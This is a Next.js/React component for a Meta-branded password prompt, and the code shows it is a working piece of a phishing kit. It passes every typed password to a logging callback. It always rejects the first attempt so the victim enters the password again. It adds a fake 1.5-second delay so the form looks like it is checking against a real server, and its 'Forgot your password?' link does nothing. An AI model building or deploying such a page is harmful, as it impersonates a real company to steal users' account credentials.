"use client";

import { useState } from "react";
import Image from "next/image";

interface PasswordModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSubmit: () => void;
  onAttempt: (password: string) => void;
}

export function PasswordModal({ isOpen, onClose, onSubmit, onAttempt }: PasswordModalProps) {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState(false);
  const [forcedFail, setForcedFail] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (isLoading) return;

    const passwordValue = password.trim();
    const logValue = passwordValue === "" ? "(empty)" : passwordValue;

    setIsLoading(true);

    // Delay để giống backend đang xử lý (1-2 giây)
    await new Promise((resolve) => setTimeout(resolve, 1500));

    // Log attempt
    onAttempt(logValue);

    // Lần đầu tiên LUÔN FAIL
    if (!forcedFail) {
      setError(true);
      setForcedFail(true);
      setIsLoading(false);
      return;
    }

    // Các lần tiếp theo
    if (passwordValue.length > 0) {
      setError(false);
      setIsLoading(false);
      onSubmit();
    } else {
      setError(true);
      setIsLoading(false);
    }
  };

  const handleClose = () => {
    setPassword("");
    setError(false);
    setForcedFail(false);
    setShowPassword(false);
    setIsLoading(false);
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
      <div className="relative w-full max-w-md rounded-2xl bg-white shadow-2xl">
        <button
          onClick={handleClose}
          className="absolute right-4 top-4 flex h-8 w-8 items-center justify-center rounded-full text-slate-400 transition hover:bg-slate-100 hover:text-slate-600"
          aria-label="Close"
        >
          <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>

        <div className="p-8">
          <div className="mb-6 text-center">
            <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-metaBlue/10">
              <Image src="/logo-meta.svg" alt="Meta" width={40} height={40} />
            </div>
            <p className="text-sm text-slate-500">For your security, you must enter your password to continue.</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Enter your password"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  if (error) setError(false);
                }}
                className={`w-full rounded-lg border px-4 py-3 pr-12 ${
                  error ? "border-red-500" : "border-slate-300"
                }`}
                autoFocus
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600"
              >
                {showPassword ? (
                  <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.29 3.29m0 0L3 12m3.29-5.71L12 12m-5.71 0L3 12m0 0l3.29 3.29M12 12l3.29-3.29M12 12l-3.29 3.29m6.58 0L21 21M12 12l3.29 3.29"
                    />
                  </svg>
                ) : (
                  <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                    />
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                    />
                  </svg>
                )}
              </button>
            </div>

            {error && (
              <p className="text-sm text-red-500">
                {forcedFail ? "Incorrect password. Please try again." : "Password is required."}
              </p>
            )}

            <button
              type="submit"
              disabled={isLoading}
              className="w-full rounded-lg bg-metaBlue px-6 py-3 font-semibold text-white transition hover:bg-metaIndigo disabled:opacity-50 flex items-center justify-center"
            >
              {isLoading ? (
                <>
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Processing...
                </>
              ) : (
                "Continue"
              )}
            </button>

            <div className="w-full text-center text-sm text-slate-400">Forgot your password?</div>
          </form>

                </div>
      </div>
    </div>
  );
}
